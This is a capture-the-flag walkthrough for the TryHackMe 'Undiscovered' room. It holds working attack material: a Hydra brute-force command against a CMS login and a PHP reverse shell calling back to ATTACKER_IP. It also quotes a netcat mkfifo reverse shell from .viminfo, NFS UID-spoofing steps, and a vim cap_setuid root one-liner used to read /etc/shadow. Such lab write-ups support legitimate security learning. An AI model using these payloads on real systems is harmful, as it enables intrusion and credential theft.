# [Undiscovered](https://tryhackme.com/room/undiscoveredup)

## Discovery consists not in seeking new landscapes, but in having new eyes..

# Capture The Flag

### user.txt

1. Add the target machine to your hosts file for easier access throughout the challenge:

```bash
echo "<TARGET_IP> undiscovered.thm" >> /etc/hosts
```

2. Run a comprehensive port scan to identify all open services on the target machine:

```bash
nmap -sV -p- undiscovered.thm
```

**Results:**

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.18
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
44473/tcp open  nlockmgr 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3. Enumerate virtual hosts to discover additional subdomains that might be hosted on the web server:

```bash
gobuster vhost -u http://undiscovered.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt | grep 200
```

4. Add the newly discovered `deliver.undiscovered.thm` subdomain to your hosts file:

```bash
echo "<TARGET_IP> deliver.undiscovered.thm" >> /etc/hosts
```

5. Perform directory enumeration on the new subdomain to find hidden directories and files:

```bash
gobuster dir -u http://deliver.undiscovered.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5
```

**Results:**

```
/templates            (Status: 301) [Size: 340] [--> http://deliver.undiscovered.thm/templates/]
/media                (Status: 301) [Size: 336] [--> http://deliver.undiscovered.thm/media/]
/files                (Status: 301) [Size: 336] [--> http://deliver.undiscovered.thm/files/]
/data                 (Status: 301) [Size: 335] [--> http://deliver.undiscovered.thm/data/]
/cms                  (Status: 301) [Size: 334] [--> http://deliver.undiscovered.thm/cms/]
/js                   (Status: 301) [Size: 333] [--> http://deliver.undiscovered.thm/js/]
/LICENSE              (Status: 200) [Size: 32472]
/server-status        (Status: 403) [Size: 289]
```

6. Download all files from the `/data` directory by navigating to `http://deliver.undiscovered.thm/data/` in your browser.

7. Examine the downloaded `mysql.initial.sql` file. Inside this file, you'll find a username `admin`.

<img width="1031" height="453" alt="SCREEN01" src="https://github.com/user-attachments/assets/1ab52f5d-b6ce-498c-8795-ddeee3be89f3" />

8. Use Hydra to perform a brute-force attack against the CMS login page using the discovered username and the rockyou wordlist:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
```

Found credentials: `admin:liverpool`

9. Log into the CMS at `http://deliver.undiscovered.thm/cms/index.php` using the credentials. Navigate to the file manager at `http://deliver.undiscovered.thm/cms/index.php?mode=filemanager` and upload a PHP reverse shell with the following content:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

10. Set up a netcat listener on your attacking machine to catch the incoming reverse shell connection:

```bash
nc -lvnp 4444
```

11. Activate the reverse shell by visiting `http://deliver.undiscovered.thm/files/shell.php` in your browser. This should trigger the connection back to your listener.

12. Once you have a shell, enumerate the system to find information about NFS exports and users:

```bash
cat /etc/exports
cat /etc/passwd | grep william
```

**Results:**

```
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

william:x:3003:3003::/home/william:/bin/bash
```

13. On your attacking machine, mount the NFS share and access william's home directory by creating a matching user:

```bash
mkdir mnt
sudo mount -t nfs <TARGET_IP>:/home/william mnt
sudo useradd -u 3003 -d /dev/shm william
sudo su william
bash
cd mnt
ls
cat user.txt
```

This exploits the NFS no_root_squash misconfiguration by matching the UID to access william's files.

<img width="470" height="365" alt="SCREEN02" src="https://github.com/user-attachments/assets/bb819b94-a130-442c-9656-29167bccfbe8" />

---

### Whats the root user's password hash?

1. Generate an SSH key pair to establish persistent access to william's account:

```bash
ssh-keygen -f william
```

Press Enter when prompted for a passphrase to create a key without a password.

2. While still in the mounted NFS directory as the william user, create an SSH directory and add your public key to authorized_keys:

```bash
mkdir .ssh
cat ../william.pub > .ssh/authorized_keys
```

3. Set proper permissions on the private key and use it to SSH into the target as william:

```bash
chmod 600 william
ssh -i william william@<TARGET_IP>
```

4. Enumerate william's home directory for interesting files. The `./script` can be used to reveal leonard's private RSA key in the output.

```bash
./script .ssh/id_rsa
```

5. Copy leonard's private key to a file on your attacking machine and set proper permissions:

```bash
chmod 600 leonard
```

6. Use leonard's private key to SSH into the target machine as leonard:

```bash
ssh -i leonard leonard@<TARGET_IP>
```

7. Once logged in as leonard, check the `.viminfo` file which contains vim command history that might reveal privilege escalation techniques:

```bash
cat .viminfo
```

**Results:**

```
# File marks:
'0  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'1  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
'2  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'3  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

# Jumplist (newest first):
-'  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
```

This shows that leonard has been using vim with Python to escalate privileges.

8. Search for binaries with special capabilities that can be exploited for privilege escalation:

```bash
getcap -r / 2>/dev/null
```

**Results:**

```
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```

The `vim.basic` binary has the `cap_setuid+ep` capability, meaning it can change its effective UID to 0 (root).

9. Exploit vim's setuid capability to spawn a root shell, then retrieve the root password hash:

```bash
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
id
cat /etc/shadow | grep -i root
```

<img width="984" height="157" alt="SCREEN03" src="https://github.com/user-attachments/assets/57a57f22-7b2d-423c-b0de-615d4f0a3017" />
